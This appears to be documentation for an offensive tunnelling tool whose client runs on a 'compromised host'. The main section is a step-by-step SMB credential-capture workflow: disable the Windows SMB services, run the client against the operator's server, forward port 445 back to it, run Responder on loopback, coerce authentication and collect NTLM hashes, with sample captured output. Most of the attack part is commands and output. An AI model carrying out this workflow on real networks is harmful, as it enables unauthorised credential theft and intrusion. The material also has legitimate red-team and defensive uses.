# Remote Port Forwards

Remote port forwards bridge a service from the operator's machine onto the messenger client's host. The client binds a listener and forwards accepted connections back to the server, which connects them to a local destination.

This is useful for hosting services (Responder, ntlmrelayx, etc.) on the compromised host without transferring additional tools.

## How It Works

The remote port forward lifecycle involves a handshake between the server and client:

1. The operator runs `remote listening_host:listening_port:destination_host:destination_port`
2. The server sends an `InitiateBINDReq` to the client
3. The client binds a TCP listener on `listening_host:listening_port` and replies with `InitiateBINDRep` (reason=0 on success)
4. When a connection arrives at the client's listener, the client sends `InitiateTCPClientReq` back to the server
5. The server connects to `destination_host:destination_port` locally and bridges the two sides

## Basic Example

Forward the client's port 8888 to the server's port 8888:

```
(PWnauryxxD)~# remote 0.0.0.0:8888:127.0.0.1:8888
[*] Queued Remote Port Forwarder request for Messenger `PWnauryxxD` for (0.0.0.0:8888) -> (127.0.0.1:8888).
[+] Messenger `PWnauryxxD` is now remote forwarding (0.0.0.0:8888) -> (127.0.0.1:8888).
```

## SMB Capture with Responder

A common use-case is forwarding Responder's SMB capture server onto a compromised Windows host.

1. Unbind the SMB service on the target (requires admin):
```powershell
Set-Service -ServiceName LanmanServer -StartupType Disabled
Stop-Service -ServiceName LanmanServer
Stop-Service -ServiceName srv2
Stop-Service -ServiceName srvnet
```

2. Verify port 445 is free:
```
> netstat -ano | findstr 445
```

3. Start the messenger client. The client connects to the server and the server will configure the remote forward:
```
> client.exe --server-url 192.168.1.100:8080 --encryption-key MyKey
```

4. Interact with the messenger and start the remote forward:
```
[+] WebSocket Messenger `wtwNJsfYRJ` is now connected.
(messenger)~# wtwNJsfYRJ
(wtwNJsfYRJ)~# remote 0.0.0.0:445:127.0.0.1:445
[*] Queued Remote Port Forwarder request for Messenger `wtwNJsfYRJ` for (0.0.0.0:445) -> (127.0.0.1:445).
[+] Messenger `wtwNJsfYRJ` is now remote forwarding (0.0.0.0:445) -> (127.0.0.1:445).
```

5. Start Responder on the server, bound to loopback:
```
# python3 Responder.py -I lo
```

6. Coerce authentication to the client host. Responder captures the forwarded credentials:
```
[SMB] NTLMv1-SSP Client   : 127.0.0.1
[SMB] NTLMv1-SSP Username : BORGAR\kclark
[SMB] NTLMv1-SSP Hash     : kclark::BORGAR:...
```

## Orphan Adoption

If a client reconnects while it still has active listeners from a previous session, it advertises them to the server via `InitiateBINDRep`. The server stores these as **orphan** remote port forwarders -- they have a listening endpoint but no destination configured.

Orphans show up in the forwarders table with `•••` as the destination:

```
(messenger)~# forwarders
                                    Forwarders
     Messenger          Type           Name    Clients      Listen     Destination
  ------------- -------------------- -------- --------- ------------- -----------
   wtwNJsfYRJ    Remote Port Forwarder AbCdEf     0     0.0.0.0:445       •••
```

To adopt an orphan, run `remote` with a matching listening endpoint. The server sets the destination without sending a new bind request (the client is already listening):

```
(wtwNJsfYRJ)~# remote 0.0.0.0:445:127.0.0.1:445
[+] Configured remote port forward `AbCdEf` on Messenger `wtwNJsfYRJ` (0.0.0.0:445 -> 127.0.0.1:445).
```

## Stopping a Remote Forward

```
(messenger)~# stop AbCdEf
[*] Sent stop to Messenger `wtwNJsfYRJ` for Remote Port Forwarder `AbCdEf` (0.0.0.0:445).
```

The server sends an `InitiateBINDReq` with an empty listening host, signaling the client to tear down the listener and close all forwarded connections. The client replies with `InitiateBINDRep` reason=5 (forwarder stopped).
